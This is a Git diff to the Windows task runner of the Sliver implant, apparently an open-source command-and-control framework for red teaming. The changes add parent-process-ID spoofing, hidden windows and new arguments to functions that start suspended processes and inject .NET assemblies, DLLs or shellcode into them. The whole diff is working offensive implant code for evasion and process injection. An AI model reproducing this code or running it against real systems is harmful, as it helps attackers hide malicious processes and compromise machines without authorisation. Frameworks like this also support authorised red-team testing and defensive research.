@@ -1,5 +1,3 @@
-//go:build windows
-
 package taskrunner
 
 /*
@@ -33,6 +31,7 @@ import (
 	"time"
 	"unsafe"
 
+	"github.com/bishopfox/sliver/implant/sliver/spoof"
 	"syscall"
 	// {{if .Config.Evasion}}
 	"github.com/bishopfox/sliver/implant/sliver/evasion"
@@ -201,12 +200,12 @@ func LocalTask(data []byte, rwxPages bool) error {
 	return err
 }
 
-func ExecuteAssembly(data []byte, process string) (string, error) {
+func ExecuteAssembly(data []byte, process string, processArgs []string, ppid uint32) (string, error) {
 	var (
 		stdoutBuf, stderrBuf bytes.Buffer
 		lpTargetHandle       windows.Handle
 	)
-	cmd, err := startProcess(process, &stdoutBuf, &stderrBuf, true)
+	cmd, err := startProcess(process, processArgs, ppid, &stdoutBuf, &stderrBuf, true)
 	if err != nil {
 		//{{if .Config.Debug}}
 		log.Println("Could not start process:", process)
@@ -254,7 +253,7 @@ func ExecuteAssembly(data []byte, process string) (string, error) {
 	return stdoutBuf.String() + stderrBuf.String(), nil
 }
 
-func SpawnDll(procName string, data []byte, offset uint32, args string, kill bool) (string, error) {
+func SpawnDll(procName string, processArgs []string, ppid uint32, data []byte, offset uint32, args string, kill bool) (string, error) {
 	var lpTargetHandle windows.Handle
 	err := refresh()
 	if err != nil {
@@ -263,7 +262,7 @@ func SpawnDll(procName string, data []byte, offset uint32, args string, kill boo
 	var stdoutBuff bytes.Buffer
 	var stderrBuff bytes.Buffer
 	// 1 - Start process
-	cmd, err := startProcess(procName, &stdoutBuff, &stderrBuff, true)
+	cmd, err := startProcess(procName, processArgs, ppid, &stdoutBuff, &stderrBuff, true)
 	if err != nil {
 		return "", err
 	}
@@ -329,9 +328,9 @@ func SpawnDll(procName string, data []byte, offset uint32, args string, kill boo
 	return "", nil
 }
 
-//SideLoad - Side load a binary as shellcode and returns its output
-func Sideload(procName string, data []byte, args string, kill bool) (string, error) {
-	return SpawnDll(procName, data, 0, "", kill)
+// SideLoad - Side load a binary as shellcode and returns its output
+func Sideload(procName string, procArgs []string, ppid uint32, data []byte, args string, kill bool) (string, error) {
+	return SpawnDll(procName, procArgs, ppid, data, 0, "", kill)
 }
 
 // Util functions
@@ -360,20 +359,30 @@ func refresh() error {
 	return nil
 }
 
-func startProcess(proc string, stdout *bytes.Buffer, stderr *bytes.Buffer, suspended bool) (*exec.Cmd, error) {
-	cmd := exec.Command(proc)
+func startProcess(proc string, args []string, ppid uint32, stdout *bytes.Buffer, stderr *bytes.Buffer, suspended bool) (*exec.Cmd, error) {
+	var cmd *exec.Cmd
+	if len(args) > 0 {
+		cmd = exec.Command(proc, args...)
+	} else {
+		cmd = exec.Command(proc)
+	}
 	cmd.SysProcAttr = &windows.SysProcAttr{
-		Token: syscall.Token(CurrentToken),
+		Token:      syscall.Token(CurrentToken),
+		HideWindow: true,
+	}
+	err := spoof.SpoofParent(ppid, cmd)
+	if err != nil {
+		// We couldn't spoof the parent, fail open and continue
+		//{{if .Config.Debug}}
+		log.Printf("could not spoof parent PID: %v\n", err)
+		//{{end}}
 	}
 	cmd.Stdout = stdout
 	cmd.Stderr = stderr
-	cmd.SysProcAttr = &windows.SysProcAttr{
-		HideWindow: true,
-	}
 	if suspended {
 		cmd.SysProcAttr.CreationFlags = windows.CREATE_SUSPENDED
 	}
-	err := cmd.Start()
+	err = cmd.Start()
 	if err != nil {
 		//{{if .Config.Debug}}
 		log.Println("Could not start process:", proc)
